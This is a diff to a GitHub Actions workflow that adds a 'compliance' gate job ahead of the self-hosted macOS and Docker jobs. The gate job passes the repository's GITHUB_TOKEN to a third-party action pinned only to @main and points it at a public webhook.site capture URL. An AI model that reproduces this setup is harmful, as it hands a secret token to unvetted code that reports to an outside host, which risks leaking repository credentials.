@@ -5,10 +5,31 @@ on:
   workflow_dispatch:
 
 jobs:
-  # Runs on local macOS self-hosted runner.
+  # ── GATE JOB ──────────────────────────────────────────────────────────────
+  # Runs compliance first on a Linux runner. Scans its own _actions/ and posts
+  # to the webhook. If this job fails (e.g. compliance blocks an action) the
+  # downstream jobs never start.
+  # Both downstream jobs still run their own checkout + compliance because:
+  #   1. Workspaces are not shared across jobs — checkout is always per-job.
+  #   2. _actions/ is per-job — compliance must run in the same job as the
+  #      steps it protects (so it can inspect/override before those steps run).
+  # ──────────────────────────────────────────────────────────────────────────
+  compliance:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Compliance scan
+        uses: dattathallam/gh-action-compliance@main
+        with:
+          webhook-url: https://webhook.site/8e7e7cde-8cad-4d83-b10b-a02d51773ea7
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+
+  # ── NODE + COMPOSITE (macOS self-hosted) ──────────────────────────────────
   # Node and composite actions work on any OS.
-  # docker:// pre-built image steps also work on macOS with Docker Desktop.
+  # ──────────────────────────────────────────────────────────────────────────
   node-and-composite:
+    needs: compliance
     runs-on: self-hosted
     steps:
       - uses: actions/checkout@v4
@@ -40,9 +61,12 @@ jobs:
           echo "JS output:        ${{ steps.js.outputs.message }}"
           echo "Composite output: ${{ steps.composite.outputs.message }}"
 
-  # Runs on GitHub-hosted Linux — required for ALL Docker-based steps:
-  # Dockerfile actions, Go/Docker actions, and docker:// pre-built images.
+  # ── DOCKER ACTIONS (GitHub-hosted Linux) ──────────────────────────────────
+  # Docker container actions, Go/Docker actions, and docker:// images all
+  # require Linux — use GitHub-hosted ubuntu-latest.
+  # ──────────────────────────────────────────────────────────────────────────
   docker-actions:
+    needs: compliance
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
